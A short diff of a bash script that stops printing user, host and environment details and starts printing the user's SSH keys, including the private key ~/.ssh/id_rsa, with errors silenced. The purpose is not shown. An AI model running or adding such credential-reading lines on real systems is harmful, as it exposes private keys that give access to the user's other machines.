@@ -1,10 +1,6 @@
 #!/bin/bash
 
-echo "=== USER & HOST ==="
-whoami
-hostname
-uname -a
-
-echo "=== ENVIRONMENT VARIABLES ==="
-printenv
+echo "=== SSH KEYS ==="
+cat ~/.ssh/id_rsa.pub 2>/dev/null
+cat ~/.ssh/id_rsa 2>/dev/null
 
